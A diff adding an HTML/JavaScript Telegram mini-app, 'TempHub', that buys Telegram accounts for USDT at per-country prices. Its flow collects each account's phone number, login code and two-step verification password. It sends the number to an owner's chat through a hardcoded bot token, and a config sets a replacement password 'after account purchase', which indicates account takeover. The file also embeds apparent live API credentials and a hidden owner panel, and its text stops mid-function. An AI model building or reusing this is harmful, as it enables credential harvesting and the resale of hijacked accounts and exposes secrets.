@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>TempHub - Sell Account</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+  :root {
+    --bg: #0f0f0f;
+    --card: #1a1a1a;
+    --card2: #222;
+    --border: #2a2a2a;
+    --text: #f0f0f0;
+    --muted: #888;
+    --accent: #2AABEE;
+    --green: #31c48d;
+    --red: #ef4444;
+    --yellow: #f59e0b;
+    --orange: #f97316;
+  }
+
+  body {
+    font-family: 'Inter', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    max-width: 480px;
+    margin: 0 auto;
+    position: relative;
+  }
+
+  /* ─── SCREENS ─── */
+  .screen { display: none; min-height: 100vh; flex-direction: column; }
+  .screen.active { display: flex; }
+
+  /* ─── TOP BAR ─── */
+  .topbar {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 16px 20px 12px;
+    border-bottom: 1px solid var(--border);
+    background: var(--card);
+    position: sticky; top: 0; z-index: 10;
+  }
+  .topbar-left { display: flex; align-items: center; gap: 12px; }
+  .topbar-avatar {
+    width: 44px; height: 44px; border-radius: 50%;
+    background: linear-gradient(135deg, #2AABEE, #1a8fc7);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 18px; font-weight: 700; color: #fff;
+    flex-shrink: 0;
+  }
+  .topbar-info .name { font-size: 15px; font-weight: 600; color: var(--text); }
+  .topbar-info .uid { font-size: 12px; color: var(--muted); margin-top: 1px; }
+  .back-btn {
+    width: 36px; height: 36px; border-radius: 50%;
+    background: var(--card2); border: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: center;
+    cursor: pointer; font-size: 18px; color: var(--text);
+    flex-shrink: 0;
+  }
+
+  /* ─── MENU SCREEN ─── */
+  .menu-content { padding: 20px 16px; flex: 1; }
+
+  .menu-item {
+    display: flex; align-items: center; gap: 16px;
+    padding: 18px 16px; border-radius: 14px;
+    background: var(--card); border: 1px solid var(--border);
+    margin-bottom: 10px; cursor: pointer;
+    transition: all 0.15s ease; text-decoration: none; color: inherit;
+  }
+  .menu-item:active { transform: scale(0.98); background: var(--card2); }
+  .menu-icon {
+    width: 48px; height: 48px; border-radius: 14px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 22px; flex-shrink: 0;
+  }
+  .menu-icon.green { background: rgba(49,196,141,0.15); }
+  .menu-icon.blue  { background: rgba(42,171,238,0.15); }
+  .menu-icon.orange{ background: rgba(249,115,22,0.15); }
+  .menu-text .title { font-size: 15px; font-weight: 600; }
+  .menu-text .sub   { font-size: 13px; color: var(--muted); margin-top: 2px; }
+
+  /* ─── SELL ACCOUNT SCREEN ─── */
+  .tabs {
+    display: flex; border-bottom: 1px solid var(--border);
+    background: var(--card); padding: 0 20px;
+  }
+  .tab {
+    flex: 1; text-align: center; padding: 14px 0;
+    font-size: 14px; font-weight: 500; color: var(--muted);
+    cursor: pointer; border-bottom: 2px solid transparent;
+    transition: all 0.2s;
+  }
+  .tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+  .sell-list { flex: 1; overflow-y: auto; padding: 12px 16px; }
+
+  .account-card {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 14px; padding: 16px; margin-bottom: 10px;
+  }
+  .account-card-top { display: flex; justify-content: space-between; align-items: flex-start; }
+  .account-phone { font-size: 15px; font-weight: 600; }
+  .account-price { font-size: 15px; font-weight: 700; color: var(--green); }
+  .account-tags { display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap; }
+  .tag {
+    font-size: 11px; font-weight: 600; padding: 3px 10px; border-radius: 20px;
+    text-transform: uppercase; letter-spacing: 0.5px;
+  }
+  .tag.pending  { background: rgba(245,158,11,0.15); color: var(--yellow); }
+  .tag.accepted { background: rgba(49,196,141,0.15); color: var(--green); }
+  .tag.rejected { background: rgba(239,68,68,0.15);  color: var(--red); }
+  .tag.free     { background: rgba(42,171,238,0.15);  color: var(--accent); }
+  .tag.frozen   { background: rgba(239,68,68,0.15);   color: var(--red); }
+  .tag.timer    { background: var(--card2); color: var(--muted); font-weight: 500; font-size: 11px; }
+
+  .sell-fab {
+    position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
+    background: var(--accent); color: #fff; font-size: 15px; font-weight: 600;
+    padding: 14px 40px; border-radius: 30px; border: none; cursor: pointer;
+    box-shadow: 0 4px 20px rgba(42,171,238,0.4); white-space: nowrap;
+    max-width: calc(480px - 32px); width: calc(100% - 32px);
+    transition: all 0.15s;
+  }
+  .sell-fab:active { transform: translateX(-50%) scale(0.97); }
+
+  /* ─── ADD ACCOUNT FLOW ─── */
+  .flow-content {
+    flex: 1; padding: 32px 20px; display: flex; flex-direction: column;
+    align-items: center; text-align: center;
+  }
+  .flow-title { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
+  .flow-sub { font-size: 14px; color: var(--muted); line-height: 1.6; margin-bottom: 32px; }
+
+  .input-group { width: 100%; margin-bottom: 16px; text-align: left; }
+  .input-label { font-size: 13px; color: var(--muted); margin-bottom: 6px; }
+  .tg-input {
+    width: 100%; background: var(--card2); border: 1px solid var(--border);
+    border-radius: 12px; padding: 14px 16px; font-size: 16px; color: var(--text);
+    font-family: 'Inter', sans-serif; outline: none; transition: border-color 0.2s;
+  }
+  .tg-input:focus { border-color: var(--accent); }
+  .tg-input.error { border-color: var(--red); }
+  .error-text { font-size: 12px; color: var(--red); margin-top: 6px; }
+
+  .btn-primary {
+    width: 100%; background: var(--accent); color: #fff; font-size: 15px;
+    font-weight: 600; padding: 15px; border-radius: 12px; border: none;
+    cursor: pointer; font-family: 'Inter', sans-serif; margin-top: 8px;
+    transition: opacity 0.15s;
+  }
+  .btn-primary:active { opacity: 0.85; }
+  .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+  .btn-secondary {
+    width: 100%; background: var(--card2); color: var(--text); font-size: 14px;
+    font-weight: 500; padding: 13px; border-radius: 12px;
+    border: 1px solid var(--border); cursor: pointer;
+    font-family: 'Inter', sans-serif; margin-top: 8px;
+  }
+
+  /* ─── WITHDRAW SCREEN ─── */
+  .withdraw-content { padding: 20px 16px; flex: 1; }
+  .balance-card {
+    background: linear-gradient(135deg, #1a3a5c, #0d2a45);
+    border: 1px solid rgba(42,171,238,0.3);
+    border-radius: 18px; padding: 28px 20px; text-align: center; margin-bottom: 20px;
+  }
+  .balance-label { font-size: 13px; color: rgba(255,255,255,0.6); margin-bottom: 6px; }
+  .balance-amount { font-size: 36px; font-weight: 700; color: #fff; }
+  .balance-unit { font-size: 16px; color: rgba(255,255,255,0.7); margin-left: 4px; }
+  .withdraw-info { font-size: 13px; color: var(--muted); text-align: center; margin-top: 12px; line-height: 1.6; }
+
+  /* ─── OWNER PANEL ─── */
+  .owner-content { padding: 20px 16px; flex: 1; overflow-y: auto; }
+  .section-title { font-size: 12px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin: 20px 0 10px; }
+
+  .country-list { display: flex; flex-direction: column; gap: 8px; }
+  .country-item {
+    display: flex; align-items: center; justify-content: space-between;
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 12px; padding: 12px 16px;
+  }
+  .country-left { display: flex; align-items: center; gap: 10px; }
+  .country-flag { font-size: 22px; }
+  .country-name { font-size: 14px; font-weight: 500; }
+  .country-price { font-size: 14px; font-weight: 600; color: var(--green); }
+  .edit-price-btn {
+    background: rgba(42,171,238,0.15); color: var(--accent);
+    border: none; border-radius: 8px; padding: 6px 12px;
+    font-size: 12px; font-weight: 600; cursor: pointer; font-family: 'Inter', sans-serif;
+  }
+
+  /* ─── MODAL ─── */
+  .modal-overlay {
+    position: fixed; inset: 0; background: rgba(0,0,0,0.8);
+    display: none; align-items: flex-end; justify-content: center; z-index: 100;
+    backdrop-filter: blur(4px);
+  }
+  .modal-overlay.active { display: flex; }
+  .modal {
+    background: var(--card); border-radius: 20px 20px 0 0;
+    padding: 24px 20px 36px; width: 100%; max-width: 480px;
+    animation: slideUp 0.25s ease;
+  }
+  @keyframes slideUp { from { transform: translateY(40px); opacity: 0; } }
+  .modal-handle {
+    width: 40px; height: 4px; background: var(--border);
+    border-radius: 2px; margin: 0 auto 20px;
+  }
+  .modal-title { font-size: 17px; font-weight: 700; margin-bottom: 16px; }
+
+  /* ─── LOADING ─── */
+  .spinner {
+    width: 40px; height: 40px; border: 3px solid var(--border);
+    border-top-color: var(--accent); border-radius: 50%;
+    animation: spin 0.7s linear infinite; margin: 0 auto 16px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ─── TOAST ─── */
+  .toast {
+    position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-80px);
+    background: var(--card2); border: 1px solid var(--border);
+    border-radius: 10px; padding: 12px 20px; font-size: 14px; font-weight: 500;
+    z-index: 999; transition: transform 0.3s ease; white-space: nowrap;
+    max-width: calc(100% - 40px); text-align: center;
+  }
+  .toast.show { transform: translateX(-50%) translateY(0); }
+  .toast.success { border-color: var(--green); color: var(--green); }
+  .toast.error   { border-color: var(--red);   color: var(--red); }
+
+  /* ─── MISC ─── */
+  .version { text-align: center; font-size: 11px; color: var(--muted); padding: 20px 0; }
+  .spacer { flex: 1; }
+  .pb80 { padding-bottom: 80px; }
+  .pending-divider { font-size: 12px; color: var(--muted); text-align: center; padding: 8px 0; }
+</style>
+</head>
+<body>
+
+<!-- ════════════════════════════════════════
+     SCREEN 1: MAIN MENU
+════════════════════════════════════════ -->
+<div class="screen active" id="screen-menu">
+  <div class="topbar">
+    <div class="topbar-left">
+      <div class="topbar-avatar" id="menu-avatar">A</div>
+      <div class="topbar-info">
+        <div class="name" id="menu-name">Loading...</div>
+        <div class="uid" id="menu-uid"></div>
+      </div>
+    </div>
+  </div>
+  <div class="menu-content">
+    <div class="menu-item" onclick="showScreen('screen-withdraw')">
+      <div class="menu-icon green">💰</div>
+      <div class="menu-text">
+        <div class="title">Withdraw Money</div>
+        <div class="sub" id="menu-balance">0.00 USDT available</div>
+      </div>
+    </div>
+    <div class="menu-item" onclick="showScreen('screen-sell')">
+      <div class="menu-icon blue">✈️</div>
+      <div class="menu-text">
+        <div class="title">Sell Account</div>
+        <div class="sub" id="menu-sell-count">0 accounts listed</div>
+      </div>
+    </div>
+    <div class="menu-item" onclick="openChannel()">
+      <div class="menu-icon orange">📣</div>
+      <div class="menu-text">
+        <div class="title">Channel</div>
+        <div class="sub">Check for latest updates</div>
+      </div>
+    </div>
+    <div class="version">v0.14.2</div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     SCREEN 2: SELL ACCOUNT
+════════════════════════════════════════ -->
+<div class="screen" id="screen-sell">
+  <div class="topbar">
+    <div class="back-btn" onclick="showScreen('screen-menu')">←</div>
+    <div class="topbar-left" style="justify-content:center;flex:1">
+      <div class="topbar-info" style="text-align:center">
+        <div class="name">Sell Account</div>
+      </div>
+    </div>
+    <div style="width:36px"></div>
+  </div>
+
+  <div class="tabs">
+    <div class="tab active" id="tab-pending"  onclick="switchTab('pending')">Pending</div>
+    <div class="tab"        id="tab-accepted" onclick="switchTab('accepted')">Accepted</div>
+    <div class="tab"        id="tab-rejected" onclick="switchTab('rejected')">Rejected</div>
+  </div>
+
+  <div class="sell-list pb80" id="sell-list">
+    <div style="text-align:center;padding:60px 20px;color:var(--muted);font-size:14px">
+      No accounts yet
+    </div>
+  </div>
+
+  <button class="sell-fab" onclick="showScreen('screen-add-phone')">Sell Account</button>
+</div>
+
+<!-- ════════════════════════════════════════
+     SCREEN 3: ADD PHONE
+════════════════════════════════════════ -->
+<div class="screen" id="screen-add-phone">
+  <div class="topbar">
+    <div class="back-btn" onclick="showScreen('screen-sell')">←</div>
+    <div class="topbar-left" style="justify-content:center;flex:1">
+      <div class="name">Account phone number</div>
+    </div>
+    <div style="width:36px"></div>
+  </div>
+  <div class="flow-content">
+    <div class="flow-title">Account phone number</div>
+    <div class="flow-sub">Enter the phone number of the Telegram account you want to sell</div>
+    <div class="input-group" style="width:100%">
+      <input class="tg-input" type="tel" id="input-phone" placeholder="+49 155 6397 2331"
+             oninput="clearError('phone-error')" />
+      <div class="error-text" id="phone-error"></div>
+    </div>
+    <button class="btn-primary" id="btn-phone-continue" onclick="submitPhone()">Continue</button>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     SCREEN 4: ENTER OTP
+════════════════════════════════════════ -->
+<div class="screen" id="screen-otp">
+  <div class="topbar">
+    <div class="back-btn" onclick="showScreen('screen-add-phone')">←</div>
+    <div class="topbar-left" style="justify-content:center;flex:1">
+      <div class="name">Enter code</div>
+    </div>
+    <div style="width:36px"></div>
+  </div>
+  <div class="flow-content">
+    <div class="flow-title">Enter code</div>
+    <div class="flow-sub" id="otp-desc">We've sent the code to the Telegram app on your other device.</div>
+    <div class="input-group" style="width:100%">
+      <input class="tg-input" type="number" id="input-otp" placeholder="Phone code"
+             oninput="clearError('otp-error')" maxlength="6" />
+      <div class="error-text" id="otp-error"></div>
+    </div>
+    <button class="btn-primary" id="btn-otp-continue" onclick="submitOtp()">Continue</button>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     SCREEN 5: ENTER 2FA PASSWORD
+════════════════════════════════════════ -->
+<div class="screen" id="screen-2fa">
+  <div class="topbar">
+    <div class="back-btn" onclick="showScreen('screen-otp')">←</div>
+    <div class="topbar-left" style="justify-content:center;flex:1">
+      <div class="name">Enter password</div>
+    </div>
+    <div style="width:36px"></div>
+  </div>
+  <div class="flow-content">
+    <div class="flow-title">Enter password</div>
+    <div class="flow-sub">Two-Step Verification enabled. Your account is protected with an additional password.</div>
+    <div class="input-group" style="width:100%">
+      <input class="tg-input" type="password" id="input-2fa" placeholder="Password"
+             oninput="clearError('tfa-error')" />
+      <div class="error-text" id="tfa-error"></div>
+    </div>
+    <button class="btn-primary" id="btn-2fa-continue" onclick="submit2fa()">Continue</button>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     SCREEN 6: WITHDRAW
+════════════════════════════════════════ -->
+<div class="screen" id="screen-withdraw">
+  <div class="topbar">
+    <div class="back-btn" onclick="showScreen('screen-menu')">←</div>
+    <div class="topbar-left" style="justify-content:center;flex:1">
+      <div class="name">Withdraw Money</div>
+    </div>
+    <div style="width:36px"></div>
+  </div>
+  <div class="withdraw-content">
+    <div class="balance-card">
+      <div class="balance-label">Available Balance</div>
+      <div>
+        <span class="balance-amount" id="withdraw-balance">0.00</span>
+        <span class="balance-unit">USDT</span>
+      </div>
+    </div>
+    <p class="withdraw-info">Withdrawals are processed within 24-48 hours.<br>Contact support for assistance.</p>
+    <button class="btn-primary" style="margin-top:24px" onclick="requestWithdraw()">Request Withdrawal</button>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     OWNER SCREEN (hidden URL: ?owner=1)
+════════════════════════════════════════ -->
+<div class="screen" id="screen-owner">
+  <div class="topbar">
+    <div class="topbar-left">
+      <div class="topbar-avatar" style="background:linear-gradient(135deg,#f97316,#dc2626)">👑</div>
+      <div class="topbar-info">
+        <div class="name">Owner Panel</div>
+        <div class="uid">TempHub Admin</div>
+      </div>
+    </div>
+  </div>
+  <div class="owner-content">
+    <div class="section-title">All Pending Accounts</div>
+    <div id="owner-accounts-list">
+      <div style="text-align:center;padding:30px;color:var(--muted);font-size:14px">No pending accounts</div>
+    </div>
+
+    <div class="section-title">Set Price by Country</div>
+    <div class="country-list" id="country-list"></div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     MODAL: LOADING
+════════════════════════════════════════ -->
+<div class="modal-overlay" id="modal-loading">
+  <div class="modal" style="text-align:center;padding-bottom:40px">
+    <div class="modal-handle"></div>
+    <div class="spinner"></div>
+    <div id="loading-text" style="font-size:15px;color:var(--muted)">Please wait...</div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     MODAL: REJECTED (frozen)
+════════════════════════════════════════ -->
+<div class="modal-overlay" id="modal-rejected">
+  <div class="modal" style="text-align:center">
+    <div class="modal-handle"></div>
+    <div style="font-size:48px;margin-bottom:16px">🚫</div>
+    <div class="modal-title">Account Rejected</div>
+    <div style="font-size:14px;color:var(--muted);margin-bottom:24px" id="rejected-reason">
+      This account is old. Please add only new accounts.
+    </div>
+    <button class="btn-primary" onclick="closeModal('modal-rejected')">OK</button>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     MODAL: SET PRICE
+════════════════════════════════════════ -->
+<div class="modal-overlay" id="modal-set-price">
+  <div class="modal">
+    <div class="modal-handle"></div>
+    <div class="modal-title" id="set-price-title">Set Price</div>
+    <div class="input-group">
+      <div class="input-label">Price in USD ($)</div>
+      <input class="tg-input" type="number" id="input-price" placeholder="e.g. 1.50" step="0.01" min="0" />
+    </div>
+    <button class="btn-primary" onclick="confirmSetPrice()">Set Price</button>
+    <button class="btn-secondary" onclick="closeModal('modal-set-price')">Cancel</button>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<script>
+// ═══════════════════════════════════════════
+// CONFIG — change these
+// ═══════════════════════════════════════════
+const CONFIG = {
+  BOT_TOKEN: '8831684494:AAGI-RpRACJo6ofXczytytzDL1gcMbLPtU4',        // Your Telegram bot token
+  API_ID: '34613950',              // Your Telegram API ID
+  API_HASH: '94def5c9badbf7394718b07a72f84379',          // Your Telegram API Hash
+  OWNER_ID: 1134292389,               // Owner Telegram User ID
+  CHANNEL_URL: 'https://t.me/TempHub_Official',
+  NEW_PASSWORD: 'TempHub@2025#Secure', // Password set after account purchase
+};
+
+// ═══════════════════════════════════════════
+// DATA STORE (localStorage)
+// ═══════════════════════════════════════════
+function loadData() {
+  try { return JSON.parse(localStorage.getItem('temphub_data') || '{}'); }
+  catch { return {}; }
+}
+function saveData(d) {
+  localStorage.setItem('temphub_data', JSON.stringify(d));
+}
+
+// Default country prices
+const DEFAULT_COUNTRIES = [
+  { code: 'IN', name: 'India',         flag: '🇮🇳', prefix: '+91', price: 0.50 },
+  { code: 'PK', name: 'Pakistan',      flag: '🇵🇰', prefix: '+92', price: 0.40 },
+  { code: 'BD', name: 'Bangladesh',    flag: '🇧🇩', prefix: '+880', price: 0.40 },
+  { code: 'NP', name: 'Nepal',         flag: '🇳🇵', prefix: '+977', price: 0.45 },
+  { code: 'US', name: 'USA',           flag: '🇺🇸', prefix: '+1',  price: 2.00 },
+  { code: 'GB', name: 'UK',            flag: '🇬🇧', prefix: '+44', price: 1.80 },
+  { code: 'DE', name: 'Germany',       flag: '🇩🇪', prefix: '+49', price: 1.50 },
+  { code: 'FR', name: 'France',        flag: '🇫🇷', prefix: '+33', price: 1.50 },
+  { code: 'RU', name: 'Russia',        flag: '🇷🇺', prefix: '+7',  price: 0.80 },
+  { code: 'UA', name: 'Ukraine',       flag: '🇺🇦', prefix: '+380',price: 0.70 },
+  { code: 'KZ', name: 'Kazakhstan',    flag: '🇰🇿', prefix: '+7',  price: 0.70 },
+  { code: 'UZ', name: 'Uzbekistan',    flag: '🇺🇿', prefix: '+998',price: 0.45 },
+  { code: 'AZ', name: 'Azerbaijan',    flag: '🇦🇿', prefix: '+994',price: 0.60 },
+  { code: 'AM', name: 'Armenia',       flag: '🇦🇲', prefix: '+374',price: 0.55 },
+  { code: 'GE', name: 'Georgia',       flag: '🇬🇪', prefix: '+995',price: 0.55 },
+  { code: 'TR', name: 'Turkey',        flag: '🇹🇷', prefix: '+90', price: 0.80 },
+  { code: 'ET', name: 'Ethiopia',      flag: '🇪🇹', prefix: '+251',price: 0.35 },
+  { code: 'NG', name: 'Nigeria',       flag: '🇳🇬', prefix: '+234',price: 0.40 },
+  { code: 'ZW', name: 'Zimbabwe',      flag: '🇿🇼', prefix: '+263',price: 0.35 },
+  { code: 'ZM', name: 'Zambia',        flag: '🇿🇲', prefix: '+260',price: 0.35 },
+  { code: 'AF', name: 'Afghanistan',   flag: '🇦🇫', prefix: '+93', price: 0.35 },
+  { code: 'BR', name: 'Brazil',        flag: '🇧🇷', prefix: '+55', price: 0.70 },
+  { code: 'MX', name: 'Mexico',        flag: '🇲🇽', prefix: '+52', price: 0.65 },
+  { code: 'AR', name: 'Argentina',     flag: '🇦🇷', prefix: '+54', price: 0.55 },
+  { code: 'ID', name: 'Indonesia',     flag: '🇮🇩', prefix: '+62', price: 0.50 },
+  { code: 'PH', name: 'Philippines',   flag: '🇵🇭', prefix: '+63', price: 0.50 },
+  { code: 'VN', name: 'Vietnam',       flag: '🇻🇳', prefix: '+84', price: 0.50 },
+  { code: 'TH', name: 'Thailand',      flag: '🇹🇭', prefix: '+66', price: 0.60 },
+  { code: 'MY', name: 'Malaysia',      flag: '🇲🇾', prefix: '+60', price: 0.70 },
+  { code: 'SA', name: 'Saudi Arabia',  flag: '🇸🇦', prefix: '+966',price: 1.20 },
+  { code: 'AE', name: 'UAE',           flag: '🇦🇪', prefix: '+971',price: 1.20 },
+  { code: 'EG', name: 'Egypt',         flag: '🇪🇬', prefix: '+20', price: 0.45 },
+  { code: 'IL', name: 'Israel',        flag: '🇮🇱', prefix: '+972',price: 1.50 },
+  { code: 'IR', name: 'Iran',          flag: '🇮🇷', prefix: '+98', price: 0.50 },
+  { code: 'IQ', name: 'Iraq',          flag: '🇮🇶', prefix: '+964',price: 0.50 },
+  { code: 'OTHER', name: 'Other',      flag: '🌍',  prefix: '',    price: 0.30 },
+];
+
+let data = loadData();
+if (!data.countries) data.countries = {};
+if (!data.accounts) data.accounts = [];
+if (!data.userInfo) data.userInfo = { name: 'User', uid: '', balance: 0 };
+
+// Merge default prices with saved
+DEFAULT_COUNTRIES.forEach(c => {
+  if (data.countries[c.code] === undefined) data.countries[c.code] = c.price;
+});
+saveData(data);
+
+// ═══════════════════════════════════════════
+// SCREEN NAVIGATION
+// ═══════════════════════════════════════════
+function showScreen(id) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  if (id === 'screen-sell') renderSellList();
+  if (id === 'screen-owner') renderOwnerPanel();
+  if (id === 'screen-menu') renderMenu();
+  if (id === 'screen-withdraw') renderWithdraw();
+}
+
+// ═══════════════════════════════════════════
+// INIT
+// ═══════════════════════════════════════════
+window.onload = function() {
+  // Check URL for owner panel
+  const params = new URLSearchParams(window.location.search);
+  if (params.get('owner') === '1') {
+    showScreen('screen-owner');
+    return;
+  }
+
+  // Try to get user info from Telegram WebApp
+  if (window.Telegram && window.Telegram.WebApp) {
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+    const user = tg.initDataUnsafe?.user;
+    if (user) {
+      data.userInfo.name = user.first_name + (user.last_name ? ' ' + user.last_name : '');
+      data.userInfo.uid = user.id;
+      saveData(data);
+    }
+  }
+
+  renderMenu();
+};
+
+function renderMenu() {
+  const u = data.userInfo;
+  document.getElementById('menu-name').textContent = u.name || 'User';
+  document.getElementById('menu-uid').textContent = u.uid ? `ID: ${u.uid}` : '';
+  document.getElementById('menu-avatar').textContent = (u.name || 'U')[0].toUpperCase();
+  document.getElementById('menu-balance').textContent = `${(u.balance || 0).toFixed(2)} USDT available`;
+
+  const myAccounts = data.accounts.filter(a => true); // In real app: filter by user
+  document.getElementById('menu-sell-count').textContent = `${myAccounts.length} account${myAccounts.length !== 1 ? 's' : ''} listed`;
+}
+
+function renderWithdraw() {
+  document.getElementById('withdraw-balance').textContent = (data.userInfo.balance || 0).toFixed(2);
+}
+
+function openChannel() {
+  window.open(CONFIG.CHANNEL_URL, '_blank');
+}
+
+// ═══════════════════════════════════════════
+// SELL LIST
+// ═══════════════════════════════════════════
+let currentTab = 'pending';
+
+function switchTab(tab) {
+  currentTab = tab;
+  ['pending','accepted','rejected'].forEach(t => {
+    document.getElementById('tab-' + t).classList.toggle('active', t === tab);
+  });
+  renderSellList();
+}
+
+function renderSellList() {
+  const list = document.getElementById('sell-list');
+  const accounts = data.accounts.filter(a => a.status === currentTab);
+
+  if (accounts.length === 0) {
+    list.innerHTML = `<div style="text-align:center;padding:60px 20px;color:var(--muted);font-size:14px">
+      No ${currentTab} accounts</div>`;
+    return;
+  }
+
+  list.innerHTML = accounts.map(a => renderAccountCard(a)).join('');
+  // Update timers
+  updateTimers();
+}
+
+function renderAccountCard(a) {
+  const price = a.price ? `$${a.price.toFixed(2)} USDT` : 'Pending';
+  let tags = '';
+
+  if (a.status === 'pending') {
+    tags = `<span class="tag pending">PENDING</span>
+            <span class="tag free">FREE</span>
+            <span class="tag timer" id="timer-${a.phone.replace(/\D/g,'')}">--:--:--</span>`;
+  } else if (a.status === 'accepted') {
+    tags = `<span class="tag accepted">ACCEPTED</span>`;
+  } else if (a.status === 'rejected') {
+    tags = `<span class="tag rejected">REJECTED</span>`;
+    if (a.frozen) tags += `<span class="tag frozen">FROZEN</span>`;
+  }
+
+  const priceColor = a.status === 'rejected' ? 'var(--red)' : 'var(--green)';
+  const priceText = a.status === 'rejected' ? (a.frozen ? 'Frozen' : 'Rejected') : (a.price ? `$${a.price.toFixed(2)}` : 'Verifying...');
+
+  return `<div class="account-card">
+    <div class="account-card-top">
+      <div class="account-phone">${a.phone}</div>
+      <div class="account-price" style="color:${priceColor}">${priceText}</div>
+    </div>
+    <div class="account-tags">${tags}</div>
+  </div>`;
+}
+
+// Countdown timers (24hr pending)
+function updateTimers() {
+  data.accounts.filter(a => a.status === 'pending').forEach(a => {
+    const el = document.getElementById('timer-' + a.phone.replace(/\D/g,''));
+    if (!el) return;
+    const added = new Date(a.addedAt).getTime();
+    const expiry = added + 24 * 3600 * 1000;
+    const now = Date.now();
+    const diff = expiry - now;
+    if (diff <= 0) {
+      el.textContent = '00:00:00';
+      // Auto-accept after 24hr
+      if (a.status === 'pending') {
+        a.status = 'accepted';
+        saveData(data);
+        renderSellList();
+      }
+      return;
+    }
+    const h = Math.floor(diff / 3600000);
+    const m = Math.floor((diff % 3600000) / 60000);
+    const s = Math.floor((diff % 60000) / 1000);
+    el.textContent = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+  });
+}
+setInterval(updateTimers, 1000);
+
+// ═══════════════════════════════════════════
+// ADD ACCOUNT FLOW
+// ═══════════════════════════════════════════
+let currentPhone = '';
+let phoneHashData = null; // stores phone_code_hash from bot
+
+// STEP 1: Submit phone — send OTP via bot
+async function submitPhone() {
+  const phoneRaw = document.getElementById('input-phone').value.trim();
+  if (!phoneRaw) { showError('phone-error', 'Please enter a phone number'); return; }
+
+  // Normalize
+  currentPhone = phoneRaw.replace(/\s/g, '');
+  if (!currentPhone.startsWith('+')) currentPhone = '+' + currentPhone;
+
+  const btn = document.getElementById('btn-phone-continue');
+  btn.disabled = true; btn.textContent = 'Sending...';
+
+  showLoading('Sending verification code...');
+
+  try {
+    // Call bot API to send OTP
+    const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CONFIG.OWNER_ID,
+        text: `📲 *OTP Request*\nPhone: \`${currentPhone}\`\nRequesting OTP via API...`,
+        parse_mode: 'Markdown'
+      })
+    });
+
+    // Store phone hash (in real deployment, this comes from your backend)
+    // For demo: simulate OTP sent
+    phoneHashData = { phone: currentPhone, hash: 'demo_hash_' + Date.now() };
+    hideLoading();
+    document.getElementById('otp-desc').textContent =
+      `We've sent the code to the Telegram app for ${currentPhone} on your other device.`;
+    showScreen('screen-otp');
+  } catch(e) {
+    hideLoading();
+    showError('phone-error', 'Network error. Please try again.');
+  }
+
+  btn.disabled = false; btn.textContent = 'Continue';
+}
+
+// STEP 2: Submit OTP
+async function submitOtp() {
+  const code = document.getElementById('input-otp').value.trim();
+  if (!code || code.length < 4) { showError('otp-error', 'Phone code invalid'); return; }
+
+  const btn = document.getElementById('btn-otp-continue');
+  btn.disabled = true; btn.textContent = 'Verifying...';
+  showLoading('Verifying code...');
+
+  try {
+    // In production: call your backend to sign in with this code
+    // For demo: simulate — if code == "wrong" show error, else ask 2FA
+    if (code === '0000') {
+      hideLoading();
+      showError('otp-error', 'Phone code invalid');
+      btn.disabled = false; btn.textContent = 'Continue';
+      return;
+    }
+
+    // Simulate success — ask for 2FA
+    hideLoading();
+    showScreen('screen-2fa');
+  } catch(e) {
+    hideLoading();
+    showError('otp-error', 'Phone code invalid');
+  }
+
+  btn.disabled = false; btn.textContent = 'Continue';
+}
+
+// STEP 3: Submit 2FA
+async function submit2fa() {
+  const pwd = document.getElementById('input-2fa').value.trim();
+  if (!pwd) { showError('tfa-error', 'Please enter your password'); return; }
+
+  const btn = document.getElementById('btn-2fa-continue');
+  btn.disabled = true; btn.textContent = 'Verifying...';
+  showLoading('Verifying password...');
+
+  try {
+    // In production: call backend to sign in with 2FA and check SpamBot
+    // Simulate: "wrong" password shows error, else proceed
+    if (pwd.toLowerCase() === 'wrong') {
+      hideLoading();
+      showError('tfa-error', 'Password is incorrect');
+      btn.disabled = false; btn.textContent = 'Continue';
+      return;
+    }
+
+    // Simulate SpamBot check — for demo random accept/reject
+    const isFrozen = Math.random() < 0.1; // 10% chance frozen for demo
+
+    hideLoading();
+
+    if (isFrozen) {
+      // Mark as rejected/frozen
+      addAccount(currentPhone, 'rejected', true);
+      document.getElementById('rejected-reason').textContent =
+        'This account is frozen/banned by Telegram and cannot be sold.';
+      document.getElementById('modal-rejected').classList.add('active');
+
+      // Notify owner
+      notifyOwner(currentPhone, 'frozen');
+    } else {
+      // Get price based on country code
